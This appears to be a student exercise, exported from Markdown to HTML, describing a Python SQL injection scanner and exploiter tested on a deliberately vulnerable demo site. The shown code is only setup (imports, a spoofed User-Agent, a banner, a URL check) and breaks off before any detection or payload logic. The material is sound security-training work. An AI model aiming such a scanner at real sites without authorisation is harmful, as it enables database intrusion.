@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Practica 3 - Tema 6 - Ejercicio 1</title>
+        <style>
+/* From extension vscode.markdown-math */
+@font-face{font-family:KaTeX_AMS;src:url(fonts/KaTeX_AMS-Regular.woff2) format("woff2"),url(fonts/KaTeX_AMS-Regular.woff) format("woff"),url(fonts/KaTeX_AMS-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Caligraphic;src:url(fonts/KaTeX_Caligraphic-Bold.woff2) format("woff2"),url(fonts/KaTeX_Caligraphic-Bold.woff) format("woff"),url(fonts/KaTeX_Caligraphic-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Caligraphic;src:url(fonts/KaTeX_Caligraphic-Regular.woff2) format("woff2"),url(fonts/KaTeX_Caligraphic-Regular.woff) format("woff"),url(fonts/KaTeX_Caligraphic-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Fraktur;src:url(fonts/KaTeX_Fraktur-Bold.woff2) format("woff2"),url(fonts/KaTeX_Fraktur-Bold.woff) format("woff"),url(fonts/KaTeX_Fraktur-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Fraktur;src:url(fonts/KaTeX_Fraktur-Regular.woff2) format("woff2"),url(fonts/KaTeX_Fraktur-Regular.woff) format("woff"),url(fonts/KaTeX_Fraktur-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Bold.woff2) format("woff2"),url(fonts/KaTeX_Main-Bold.woff) format("woff"),url(fonts/KaTeX_Main-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-BoldItalic.woff2) format("woff2"),url(fonts/KaTeX_Main-BoldItalic.woff) format("woff"),url(fonts/KaTeX_Main-BoldItalic.ttf) format("truetype");font-weight:700;font-style:italic}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Italic.woff2) format("woff2"),url(fonts/KaTeX_Main-Italic.woff) format("woff"),url(fonts/KaTeX_Main-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Regular.woff2) format("woff2"),url(fonts/KaTeX_Main-Regular.woff) format("woff"),url(fonts/KaTeX_Main-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Math;src:url(fonts/KaTeX_Math-BoldItalic.woff2) format("woff2"),url(fonts/KaTeX_Math-BoldItalic.woff) format("woff"),url(fonts/KaTeX_Math-BoldItalic.ttf) format("truetype");font-weight:700;font-style:italic}@font-face{font-family:KaTeX_Math;src:url(fonts/KaTeX_Math-Italic.woff2) format("woff2"),url(fonts/KaTeX_Math-Italic.woff) format("woff"),url(fonts/KaTeX_Math-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Bold.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Bold.woff) format("woff"),url(fonts/KaTeX_SansSerif-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Italic.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Italic.woff) format("woff"),url(fonts/KaTeX_SansSerif-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Regular.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Regular.woff) format("woff"),url(fonts/KaTeX_SansSerif-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Script;src:url(fonts/KaTeX_Script-Regular.woff2) format("woff2"),url(fonts/KaTeX_Script-Regular.woff) format("woff"),url(fonts/KaTeX_Script-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size1;src:url(fonts/KaTeX_Size1-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size1-Regular.woff) format("woff"),url(fonts/KaTeX_Size1-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size2;src:url(fonts/KaTeX_Size2-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size2-Regular.woff) format("woff"),url(fonts/KaTeX_Size2-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size3;src:url(fonts/KaTeX_Size3-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size3-Regular.woff) format("woff"),url(fonts/KaTeX_Size3-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size4;src:url(fonts/KaTeX_Size4-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size4-Regular.woff) format("woff"),url(fonts/KaTeX_Size4-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Typewriter;src:url(fonts/KaTeX_Typewriter-Regular.woff2) format("woff2"),url(fonts/KaTeX_Typewriter-Regular.woff) format("woff"),url(fonts/KaTeX_Typewriter-Regular.ttf) format("truetype");font-weight:400;font-style:normal}.katex{font:normal 1.21em KaTeX_Main,Times New Roman,serif;line-height:1.2;text-indent:0;text-rendering:auto;border-color:currentColor}.katex *{-ms-high-contrast-adjust:none!important}.katex .katex-version:after{content:"0.13.0"}.katex .katex-mathml{position:absolute;clip:rect(1px,1px,1px,1px);padding:0;border:0;height:1px;width:1px;overflow:hidden}.katex .katex-html>.newline{display:block}.katex .base{position:relative;white-space:nowrap;width:-webkit-min-content;width:-moz-min-content;width:min-content}.katex .base,.katex .strut{display:inline-block}.katex .textbf{font-weight:700}.katex .textit{font-style:italic}.katex .textrm{font-family:KaTeX_Main}.katex .textsf{font-family:KaTeX_SansSerif}.katex .texttt{font-family:KaTeX_Typewriter}.katex .mathnormal{font-family:KaTeX_Math;font-style:italic}.katex .mathit{font-family:KaTeX_Main;font-style:italic}.katex .mathrm{font-style:normal}.katex .mathbf{font-family:KaTeX_Main;font-weight:700}.katex .boldsymbol{font-family:KaTeX_Math;font-weight:700;font-style:italic}.katex .amsrm,.katex .mathbb,.katex .textbb{font-family:KaTeX_AMS}.katex .mathcal{font-family:KaTeX_Caligraphic}.katex .mathfrak,.katex .textfrak{font-family:KaTeX_Fraktur}.katex .mathtt{font-family:KaTeX_Typewriter}.katex .mathscr,.katex .textscr{font-family:KaTeX_Script}.katex .mathsf,.katex .textsf{font-family:KaTeX_SansSerif}.katex .mathboldsf,.katex .textboldsf{font-family:KaTeX_SansSerif;font-weight:700}.katex .mathitsf,.katex .textitsf{font-family:KaTeX_SansSerif;font-style:italic}.katex .mainrm{font-family:KaTeX_Main;font-style:normal}.katex .vlist-t{display:inline-table;table-layout:fixed;border-collapse:collapse}.katex .vlist-r{display:table-row}.katex .vlist{display:table-cell;vertical-align:bottom;position:relative}.katex .vlist>span{display:block;height:0;position:relative}.katex .vlist>span>span{display:inline-block}.katex .vlist>span>.pstrut{overflow:hidden;width:0}.katex .vlist-t2{margin-right:-2px}.katex .vlist-s{display:table-cell;vertical-align:bottom;font-size:1px;width:2px;min-width:2px}.katex .vbox{display:inline-flex;flex-direction:column;align-items:baseline}.katex .hbox{width:100%}.katex .hbox,.katex .thinbox{display:inline-flex;flex-direction:row}.katex .thinbox{width:0;max-width:0}.katex .msupsub{text-align:left}.katex .mfrac>span>span{text-align:center}.katex .mfrac .frac-line{display:inline-block;width:100%;border-bottom-style:solid}.katex .hdashline,.katex .hline,.katex .mfrac .frac-line,.katex .overline .overline-line,.katex .rule,.katex .underline .underline-line{min-height:1px}.katex .mspace{display:inline-block}.katex .clap,.katex .llap,.katex .rlap{width:0;position:relative}.katex .clap>.inner,.katex .llap>.inner,.katex .rlap>.inner{position:absolute}.katex .clap>.fix,.katex .llap>.fix,.katex .rlap>.fix{display:inline-block}.katex .llap>.inner{right:0}.katex .clap>.inner,.katex .rlap>.inner{left:0}.katex .clap>.inner>span{margin-left:-50%;margin-right:50%}.katex .rule{display:inline-block;border:0 solid;position:relative}.katex .hline,.katex .overline .overline-line,.katex .underline .underline-line{display:inline-block;width:100%;border-bottom-style:solid}.katex .hdashline{display:inline-block;width:100%;border-bottom-style:dashed}.katex .sqrt>.root{margin-left:.27777778em;margin-right:-.55555556em}.katex .fontsize-ensurer.reset-size1.size1,.katex .sizing.reset-size1.size1{font-size:1em}.katex .fontsize-ensurer.reset-size1.size2,.katex .sizing.reset-size1.size2{font-size:1.2em}.katex .fontsize-ensurer.reset-size1.size3,.katex .sizing.reset-size1.size3{font-size:1.4em}.katex .fontsize-ensurer.reset-size1.size4,.katex .sizing.reset-size1.size4{font-size:1.6em}.katex .fontsize-ensurer.reset-size1.size5,.katex .sizing.reset-size1.size5{font-size:1.8em}.katex .fontsize-ensurer.reset-size1.size6,.katex .sizing.reset-size1.size6{font-size:2em}.katex .fontsize-ensurer.reset-size1.size7,.katex .sizing.reset-size1.size7{font-size:2.4em}.katex .fontsize-ensurer.reset-size1.size8,.katex .sizing.reset-size1.size8{font-size:2.88em}.katex .fontsize-ensurer.reset-size1.size9,.katex .sizing.reset-size1.size9{font-size:3.456em}.katex .fontsize-ensurer.reset-size1.size10,.katex .sizing.reset-size1.size10{font-size:4.148em}.katex .fontsize-ensurer.reset-size1.size11,.katex .sizing.reset-size1.size11{font-size:4.976em}.katex .fontsize-ensurer.reset-size2.size1,.katex .sizing.reset-size2.size1{font-size:.83333333em}.katex .fontsize-ensurer.reset-size2.size2,.katex .sizing.reset-size2.size2{font-size:1em}.katex .fontsize-ensurer.reset-size2.size3,.katex .sizing.reset-size2.size3{font-size:1.16666667em}.katex .fontsize-ensurer.reset-size2.size4,.katex .sizing.reset-size2.size4{font-size:1.33333333em}.katex .fontsize-ensurer.reset-size2.size5,.katex .sizing.reset-size2.size5{font-size:1.5em}.katex .fontsize-ensurer.reset-size2.size6,.katex .sizing.reset-size2.size6{font-size:1.66666667em}.katex .fontsize-ensurer.reset-size2.size7,.katex .sizing.reset-size2.size7{font-size:2em}.katex .fontsize-ensurer.reset-size2.size8,.katex .sizing.reset-size2.size8{font-size:2.4em}.katex .fontsize-ensurer.reset-size2.size9,.katex .sizing.reset-size2.size9{font-size:2.88em}.katex .fontsize-ensurer.reset-size2.size10,.katex .sizing.reset-size2.size10{font-size:3.45666667em}.katex .fontsize-ensurer.reset-size2.size11,.katex .sizing.reset-size2.size11{font-size:4.14666667em}.katex .fontsize-ensurer.reset-size3.size1,.katex .sizing.reset-size3.size1{font-size:.71428571em}.katex .fontsize-ensurer.reset-size3.size2,.katex .sizing.reset-size3.size2{font-size:.85714286em}.katex .fontsize-ensurer.reset-size3.size3,.katex .sizing.reset-size3.size3{font-size:1em}.katex .fontsize-ensurer.reset-size3.size4,.katex .sizing.reset-size3.size4{font-size:1.14285714em}.katex .fontsize-ensurer.reset-size3.size5,.katex .sizing.reset-size3.size5{font-size:1.28571429em}.katex .fontsize-ensurer.reset-size3.size6,.katex .sizing.reset-size3.size6{font-size:1.42857143em}.katex .fontsize-ensurer.reset-size3.size7,.katex .sizing.reset-size3.size7{font-size:1.71428571em}.katex .fontsize-ensurer.reset-size3.size8,.katex .sizing.reset-size3.size8{font-size:2.05714286em}.katex .fontsize-ensurer.reset-size3.size9,.katex .sizing.reset-size3.size9{font-size:2.46857143em}.katex .fontsize-ensurer.reset-size3.size10,.katex .sizing.reset-size3.size10{font-size:2.96285714em}.katex .fontsize-ensurer.reset-size3.size11,.katex .sizing.reset-size3.size11{font-size:3.55428571em}.katex .fontsize-ensurer.reset-size4.size1,.katex .sizing.reset-size4.size1{font-size:.625em}.katex .fontsize-ensurer.reset-size4.size2,.katex .sizing.reset-size4.size2{font-size:.75em}.katex .fontsize-ensurer.reset-size4.size3,.katex .sizing.reset-size4.size3{font-size:.875em}.katex .fontsize-ensurer.reset-size4.size4,.katex .sizing.reset-size4.size4{font-size:1em}.katex .fontsize-ensurer.reset-size4.size5,.katex .sizing.reset-size4.size5{font-size:1.125em}.katex .fontsize-ensurer.reset-size4.size6,.katex .sizing.reset-size4.size6{font-size:1.25em}.katex .fontsize-ensurer.reset-size4.size7,.katex .sizing.reset-size4.size7{font-size:1.5em}.katex .fontsize-ensurer.reset-size4.size8,.katex .sizing.reset-size4.size8{font-size:1.8em}.katex .fontsize-ensurer.reset-size4.size9,.katex .sizing.reset-size4.size9{font-size:2.16em}.katex .fontsize-ensurer.reset-size4.size10,.katex .sizing.reset-size4.size10{font-size:2.5925em}.katex .fontsize-ensurer.reset-size4.size11,.katex .sizing.reset-size4.size11{font-size:3.11em}.katex .fontsize-ensurer.reset-size5.size1,.katex .sizing.reset-size5.size1{font-size:.55555556em}.katex .fontsize-ensurer.reset-size5.size2,.katex .sizing.reset-size5.size2{font-size:.66666667em}.katex .fontsize-ensurer.reset-size5.size3,.katex .sizing.reset-size5.size3{font-size:.77777778em}.katex .fontsize-ensurer.reset-size5.size4,.katex .sizing.reset-size5.size4{font-size:.88888889em}.katex .fontsize-ensurer.reset-size5.size5,.katex .sizing.reset-size5.size5{font-size:1em}.katex .fontsize-ensurer.reset-size5.size6,.katex .sizing.reset-size5.size6{font-size:1.11111111em}.katex .fontsize-ensurer.reset-size5.size7,.katex .sizing.reset-size5.size7{font-size:1.33333333em}.katex .fontsize-ensurer.reset-size5.size8,.katex .sizing.reset-size5.size8{font-size:1.6em}.katex .fontsize-ensurer.reset-size5.size9,.katex .sizing.reset-size5.size9{font-size:1.92em}.katex .fontsize-ensurer.reset-size5.size10,.katex .sizing.reset-size5.size10{font-size:2.30444444em}.katex .fontsize-ensurer.reset-size5.size11,.katex .sizing.reset-size5.size11{font-size:2.76444444em}.katex .fontsize-ensurer.reset-size6.size1,.katex .sizing.reset-size6.size1{font-size:.5em}.katex .fontsize-ensurer.reset-size6.size2,.katex .sizing.reset-size6.size2{font-size:.6em}.katex .fontsize-ensurer.reset-size6.size3,.katex .sizing.reset-size6.size3{font-size:.7em}.katex .fontsize-ensurer.reset-size6.size4,.katex .sizing.reset-size6.size4{font-size:.8em}.katex .fontsize-ensurer.reset-size6.size5,.katex .sizing.reset-size6.size5{font-size:.9em}.katex .fontsize-ensurer.reset-size6.size6,.katex .sizing.reset-size6.size6{font-size:1em}.katex .fontsize-ensurer.reset-size6.size7,.katex .sizing.reset-size6.size7{font-size:1.2em}.katex .fontsize-ensurer.reset-size6.size8,.katex .sizing.reset-size6.size8{font-size:1.44em}.katex .fontsize-ensurer.reset-size6.size9,.katex .sizing.reset-size6.size9{font-size:1.728em}.katex .fontsize-ensurer.reset-size6.size10,.katex .sizing.reset-size6.size10{font-size:2.074em}.katex .fontsize-ensurer.reset-size6.size11,.katex .sizing.reset-size6.size11{font-size:2.488em}.katex .fontsize-ensurer.reset-size7.size1,.katex .sizing.reset-size7.size1{font-size:.41666667em}.katex .fontsize-ensurer.reset-size7.size2,.katex .sizing.reset-size7.size2{font-size:.5em}.katex .fontsize-ensurer.reset-size7.size3,.katex .sizing.reset-size7.size3{font-size:.58333333em}.katex .fontsize-ensurer.reset-size7.size4,.katex .sizing.reset-size7.size4{font-size:.66666667em}.katex .fontsize-ensurer.reset-size7.size5,.katex .sizing.reset-size7.size5{font-size:.75em}.katex .fontsize-ensurer.reset-size7.size6,.katex .sizing.reset-size7.size6{font-size:.83333333em}.katex .fontsize-ensurer.reset-size7.size7,.katex .sizing.reset-size7.size7{font-size:1em}.katex .fontsize-ensurer.reset-size7.size8,.katex .sizing.reset-size7.size8{font-size:1.2em}.katex .fontsize-ensurer.reset-size7.size9,.katex .sizing.reset-size7.size9{font-size:1.44em}.katex .fontsize-ensurer.reset-size7.size10,.katex .sizing.reset-size7.size10{font-size:1.72833333em}.katex .fontsize-ensurer.reset-size7.size11,.katex .sizing.reset-size7.size11{font-size:2.07333333em}.katex .fontsize-ensurer.reset-size8.size1,.katex .sizing.reset-size8.size1{font-size:.34722222em}.katex .fontsize-ensurer.reset-size8.size2,.katex .sizing.reset-size8.size2{font-size:.41666667em}.katex .fontsize-ensurer.reset-size8.size3,.katex .sizing.reset-size8.size3{font-size:.48611111em}.katex .fontsize-ensurer.reset-size8.size4,.katex .sizing.reset-size8.size4{font-size:.55555556em}.katex .fontsize-ensurer.reset-size8.size5,.katex .sizing.reset-size8.size5{font-size:.625em}.katex .fontsize-ensurer.reset-size8.size6,.katex .sizing.reset-size8.size6{font-size:.69444444em}.katex .fontsize-ensurer.reset-size8.size7,.katex .sizing.reset-size8.size7{font-size:.83333333em}.katex .fontsize-ensurer.reset-size8.size8,.katex .sizing.reset-size8.size8{font-size:1em}.katex .fontsize-ensurer.reset-size8.size9,.katex .sizing.reset-size8.size9{font-size:1.2em}.katex .fontsize-ensurer.reset-size8.size10,.katex .sizing.reset-size8.size10{font-size:1.44027778em}.katex .fontsize-ensurer.reset-size8.size11,.katex .sizing.reset-size8.size11{font-size:1.72777778em}.katex .fontsize-ensurer.reset-size9.size1,.katex .sizing.reset-size9.size1{font-size:.28935185em}.katex .fontsize-ensurer.reset-size9.size2,.katex .sizing.reset-size9.size2{font-size:.34722222em}.katex .fontsize-ensurer.reset-size9.size3,.katex .sizing.reset-size9.size3{font-size:.40509259em}.katex .fontsize-ensurer.reset-size9.size4,.katex .sizing.reset-size9.size4{font-size:.46296296em}.katex .fontsize-ensurer.reset-size9.size5,.katex .sizing.reset-size9.size5{font-size:.52083333em}.katex .fontsize-ensurer.reset-size9.size6,.katex .sizing.reset-size9.size6{font-size:.5787037em}.katex .fontsize-ensurer.reset-size9.size7,.katex .sizing.reset-size9.size7{font-size:.69444444em}.katex .fontsize-ensurer.reset-size9.size8,.katex .sizing.reset-size9.size8{font-size:.83333333em}.katex .fontsize-ensurer.reset-size9.size9,.katex .sizing.reset-size9.size9{font-size:1em}.katex .fontsize-ensurer.reset-size9.size10,.katex .sizing.reset-size9.size10{font-size:1.20023148em}.katex .fontsize-ensurer.reset-size9.size11,.katex .sizing.reset-size9.size11{font-size:1.43981481em}.katex .fontsize-ensurer.reset-size10.size1,.katex .sizing.reset-size10.size1{font-size:.24108004em}.katex .fontsize-ensurer.reset-size10.size2,.katex .sizing.reset-size10.size2{font-size:.28929605em}.katex .fontsize-ensurer.reset-size10.size3,.katex .sizing.reset-size10.size3{font-size:.33751205em}.katex .fontsize-ensurer.reset-size10.size4,.katex .sizing.reset-size10.size4{font-size:.38572806em}.katex .fontsize-ensurer.reset-size10.size5,.katex .sizing.reset-size10.size5{font-size:.43394407em}.katex .fontsize-ensurer.reset-size10.size6,.katex .sizing.reset-size10.size6{font-size:.48216008em}.katex .fontsize-ensurer.reset-size10.size7,.katex .sizing.reset-size10.size7{font-size:.57859209em}.katex .fontsize-ensurer.reset-size10.size8,.katex .sizing.reset-size10.size8{font-size:.69431051em}.katex .fontsize-ensurer.reset-size10.size9,.katex .sizing.reset-size10.size9{font-size:.83317261em}.katex .fontsize-ensurer.reset-size10.size10,.katex .sizing.reset-size10.size10{font-size:1em}.katex .fontsize-ensurer.reset-size10.size11,.katex .sizing.reset-size10.size11{font-size:1.19961427em}.katex .fontsize-ensurer.reset-size11.size1,.katex .sizing.reset-size11.size1{font-size:.20096463em}.katex .fontsize-ensurer.reset-size11.size2,.katex .sizing.reset-size11.size2{font-size:.24115756em}.katex .fontsize-ensurer.reset-size11.size3,.katex .sizing.reset-size11.size3{font-size:.28135048em}.katex .fontsize-ensurer.reset-size11.size4,.katex .sizing.reset-size11.size4{font-size:.32154341em}.katex .fontsize-ensurer.reset-size11.size5,.katex .sizing.reset-size11.size5{font-size:.36173633em}.katex .fontsize-ensurer.reset-size11.size6,.katex .sizing.reset-size11.size6{font-size:.40192926em}.katex .fontsize-ensurer.reset-size11.size7,.katex .sizing.reset-size11.size7{font-size:.48231511em}.katex .fontsize-ensurer.reset-size11.size8,.katex .sizing.reset-size11.size8{font-size:.57877814em}.katex .fontsize-ensurer.reset-size11.size9,.katex .sizing.reset-size11.size9{font-size:.69453376em}.katex .fontsize-ensurer.reset-size11.size10,.katex .sizing.reset-size11.size10{font-size:.83360129em}.katex .fontsize-ensurer.reset-size11.size11,.katex .sizing.reset-size11.size11{font-size:1em}.katex .delimsizing.size1{font-family:KaTeX_Size1}.katex .delimsizing.size2{font-family:KaTeX_Size2}.katex .delimsizing.size3{font-family:KaTeX_Size3}.katex .delimsizing.size4{font-family:KaTeX_Size4}.katex .delimsizing.mult .delim-size1>span{font-family:KaTeX_Size1}.katex .delimsizing.mult .delim-size4>span{font-family:KaTeX_Size4}.katex .nulldelimiter{display:inline-block;width:.12em}.katex .delimcenter,.katex .op-symbol{position:relative}.katex .op-symbol.small-op{font-family:KaTeX_Size1}.katex .op-symbol.large-op{font-family:KaTeX_Size2}.katex .accent>.vlist-t,.katex .op-limits>.vlist-t{text-align:center}.katex .accent .accent-body{position:relative}.katex .accent .accent-body:not(.accent-full){width:0}.katex .overlay{display:block}.katex .mtable .vertical-separator{display:inline-block;min-width:1px}.katex .mtable .arraycolsep{display:inline-block}.katex .mtable .col-align-c>.vlist-t{text-align:center}.katex .mtable .col-align-l>.vlist-t{text-align:left}.katex .mtable .col-align-r>.vlist-t{text-align:right}.katex .svg-align{text-align:left}.katex svg{display:block;position:absolute;width:100%;height:inherit;fill:currentColor;stroke:currentColor;fill-rule:nonzero;fill-opacity:1;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-dasharray:none;stroke-dashoffset:0;stroke-opacity:1}.katex svg path{stroke:none}.katex img{border-style:none;min-width:0;min-height:0;max-width:none;max-height:none}.katex .stretchy{width:100%;display:block;position:relative;overflow:hidden}.katex .stretchy:after,.katex .stretchy:before{content:""}.katex .hide-tail{width:100%;position:relative;overflow:hidden}.katex .halfarrow-left{position:absolute;left:0;width:50.2%;overflow:hidden}.katex .halfarrow-right{position:absolute;right:0;width:50.2%;overflow:hidden}.katex .brace-left{position:absolute;left:0;width:25.1%;overflow:hidden}.katex .brace-center{position:absolute;left:25%;width:50%;overflow:hidden}.katex .brace-right{position:absolute;right:0;width:25.1%;overflow:hidden}.katex .x-arrow-pad{padding:0 .5em}.katex .cd-arrow-pad{padding:0 .55556em 0 .27778em}.katex .mover,.katex .munder,.katex .x-arrow{text-align:center}.katex .boxpad{padding:0 .3em}.katex .fbox,.katex .fcolorbox{box-sizing:border-box;border:.04em solid}.katex .cancel-pad{padding:0 .2em}.katex .cancel-lap{margin-left:-.2em;margin-right:-.2em}.katex .sout{border-bottom-style:solid;border-bottom-width:.08em}.katex .angl{box-sizing:border-content;border-top:.049em solid;border-right:.049em solid;margin-right:.03889em}.katex .anglpad{padding:0 .03889em}.katex .eqn-num:before{counter-increment:katexEqnNo;content:"(" counter(katexEqnNo) ")"}.katex .mml-eqn-num:before{counter-increment:mmlEqnNo;content:"(" counter(mmlEqnNo) ")"}.katex .mtr-glue{width:50%}.katex .cd-vert-arrow{display:inline-block;position:relative}.katex .cd-label-left{display:inline-block;position:absolute;right:calc(50% + .3em);text-align:left}.katex .cd-label-right{display:inline-block;position:absolute;left:calc(50% + .3em);text-align:right}.katex-display{display:block;margin:1em 0;text-align:center}.katex-display>.katex{display:block;text-align:center;white-space:nowrap}.katex-display>.katex>.katex-html{display:block;position:relative}.katex-display>.katex>.katex-html>.tag{position:absolute;right:0}.katex-display.leqno>.katex>.katex-html>.tag{left:0;right:auto}.katex-display.fleqn>.katex{text-align:left;padding-left:2em}body{counter-reset:katexEqnNo mmlEqnNo}
+
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.katex-error {
+	color: var(--vscode-editorError-foreground);
+}
+
+</style>
+        
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
+</style>
+        
+        
+        
+    </head>
+    <body class="vscode-body vscode-light">
+        <h1 id="practica-3---tema-6---ejercicio-1">Practica 3 - Tema 6 - Ejercicio 1</h1>
+<h2 id="resumen">Resumen</h2>
+<p>Este código está probado en <a href="http://testphp.vulnweb.com/listproducts.php?cat=1">vulvweb</a>.</p>
+<p>El código solo funciona en GET a la hora de explotar, por falta de tiempo. Pero te pone si se ha detectado un posible form vulnerable. (<a href="http://testphp.vulnweb.com/signup.php">Registro de vulnvweb</a>)</p>
+<p>El código puede ser un poco caotico, ya que es la primera vez que desarrollo una herramienta en Python e iba con falta de tiempo.</p>
+<p>Tienes tanto el script como la documentación y screenshoots en mi repositorio de <a href="https://github.com/MainDavis/Ciber">GitHub</a>.</p>
+<h2 id="uso">Uso</h2>
+<pre><code class="language-bash"><div>python3 scanner.py [url]
+</div></code></pre>
+<pre><code class="language-bash"><div>python3 scanner.py <span class="hljs-string">&quot;http://testphp.vulnweb.com/listproducts.php?cat=1&quot;</span>
+</div></code></pre>
+<h2 id="código">Código</h2>
+<pre><code class="language-python"><div><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> pprint
+<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup <span class="hljs-keyword">as</span> bs
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse, urljoin
+<span class="hljs-keyword">from</span> prettytable <span class="hljs-keyword">import</span> PrettyTable
+
+s = requests.Session()
+<span class="hljs-comment"># Creo el User-Agent que voy a usar</span>
+s.headers[<span class="hljs-string">&quot;User-Agent&quot;</span>] = <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36&quot;</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bcolors</span>:</span>
+    HEADER = <span class="hljs-string">&#x27;\033[95m&#x27;</span>
+    OKGREEN = <span class="hljs-string">&#x27;\033[92m&#x27;</span>
+    WARNING = <span class="hljs-string">&#x27;\033[93m&#x27;</span>
+    FAIL = <span class="hljs-string">&#x27;\033[91m&#x27;</span>
+    ENDC = <span class="hljs-string">&#x27;\033[0m&#x27;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">banner</span>():</span>
+    print(<span class="hljs-string">&quot;\n--------------------------------------------------------------------------------------------------------------------------------&quot;</span>)
+    print(bcolors.HEADER)
+    print(<span class="hljs-string">&quot;  ▄████████ ████████▄    ▄█        ▄█          ▄████████  ▄████████    ▄████████ ███▄▄▄▄   ███▄▄▄▄      ▄████████    ▄████████  &quot;</span>)
+    print(<span class="hljs-string">&quot;  ███    ███ ███    ███  ███       ███         ███    ███ ███    ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄   ███    ███   ███    ███ &quot;</span>)
+    print(<span class="hljs-string">&quot;  ███    █▀  ███    ███  ███       ███▌        ███    █▀  ███    █▀    ███    ███ ███   ███ ███   ███   ███    █▀    ███    ███ &quot;</span>)
+    print(<span class="hljs-string">&quot;  ███        ███    ███  ███       ███▌        ███        ███          ███    ███ ███   ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ &quot;</span>)
+    print(<span class="hljs-string">&quot;▀███████████ ███    ███  ███       ███▌      ▀███████████ ███        ▀███████████ ███   ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   &quot;</span>)
+    print(<span class="hljs-string">&quot;         ███ ███    ███  ███       ███                ███ ███    █▄    ███    ███ ███   ███ ███   ███   ███    █▄  ▀███████████ &quot;</span>)
+    print(<span class="hljs-string">&quot;   ▄█    ███ ███  ▀ ███  ███▌    ▄ ███          ▄█    ███ ███    ███   ███    ███ ███   ███ ███   ███   ███    ███   ███    ███ &quot;</span>)
+    print(<span class="hljs-string">&quot; ▄████████▀   ▀██████▀▄█ █████▄▄██ █▀         ▄████████▀  ████████▀    ███    █▀   ▀█   █▀   ▀█   █▀    ██████████   ███    ███ &quot;</span>)
+    print(<span class="hljs-string">&quot;                         ▀                                                                                           ███    ███ &quot;</span>)
+    print(bcolors.ENDC)
+    print(<span class="hljs-string">&quot;----------------------------------------------------- By MainDavis -------------------------------------------------------------\n\n&quot;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">comprobarURL</span>(<span class="hljs-params">url</span>):</span>
+    <span class="hljs-comment">#Compruebo que se ha metido el http o https para que no de errores</span>
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;http://&quot;</span> <span class="hljs-keyword">in</span> url) <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;https://&quot;</span> <span class="hljs-keyword">in</span> url):
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vulnerable</span>(<span class="hljs-params">response</span>):</span>
